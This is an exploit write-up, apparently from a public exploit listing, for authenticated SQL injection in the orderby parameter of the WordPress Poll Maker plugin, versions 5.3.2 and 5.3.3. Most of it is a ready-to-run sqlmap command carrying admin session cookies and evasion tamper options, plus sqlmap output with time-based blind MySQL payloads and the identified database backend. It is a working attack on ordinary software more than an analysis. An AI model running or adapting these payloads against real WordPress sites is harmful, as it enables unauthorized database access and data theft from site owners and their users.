### Exploit Title: WordPress Poll Maker Plugin SQL Injection 
### Date: 2024-07-11
### Exploit Author: tmrswrr
### Category : Webapps
### Vendor: https://ays-pro.com/wordpress/poll-maker
### Version 5.3.2 , 5.3.3

1. **Access the Admin Panel:**
   - Navigate to the admin panel of your WordPress site.
   - Go to `Poll Maker`  > `Results` > https://localhost/wordpress/wp-admin/admin.php?page=poll-maker-ays-results&orderby=id&order=desc
     
3. Search for orderby parameter.

## SQLMAP COMMAND

```bash
python3 sqlmap.py -u "https://localhost/wordpress/wp-admin/admin.php?page=poll-maker-ays-results&orderby=id&order=desc" --cookie="wordpress_logged_in_d31d6d9d0bfd834c03c5a471886561f0=admin|1720874410|daS0lCfo568OgTQNkSLPI9aURdg7g9e3OnbV4ihMTBf|557daf9ff0e48a2de0eea2789b9c6ae90fe5f0c7676b6f7a3a5559a911e5058b; wordpress_sec_d31d6d9d0bfd834c03c5a471886561f0=admin|1720874410|daS0lCfo568OgTQNkSLPI9aURdg7g9e3OnbV4ihMTBf|073a862ad3287a707abe5357a183ff1e7f4ebe2f505c07a7bbd8248685364a01; wordpress_test_cookie=WP Cookie check; wp_lang=en_US; wp-settings-1=editor=html; wp-settings-time-1=1720701610" --batch --dbms=mysql --threads=10 --no-cast --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 -p orderby

## RESULT

Parameter: orderby (GET)
    Type: time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: page=poll-maker-ays-results&orderby=id PROCEDURE ANALYSE(EXTRACTVALUE(3054,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x58655778))))),1)# wcUc&order=desc
    Vector: PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)
---

---
[08:03:59] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[08:03:59] [INFO] the back-end DBMS is MySQL
[08:03:59] [PAYLOAD] id/**/PrOCEdUrE/**/analySE(exTRActvALuE(6707,CoNcAT(0x5c,(iF((VeRSION()/**/LikE/**/0x254d61726961444225),BenChmaRk(5000000,MD5(0x6e454541)),6707)))),1)#/**/ZrRh
[08:03:59] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[08:04:01] [DEBUG] used the default behavior, running in batch mode
web application technology: Apache 2.4.54, PHP 8.0.23
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```
<img alt="Result" src="https://raw.githubusercontent.com/capture0x/Poll-Maker-SQL-Injection/main/11.png">



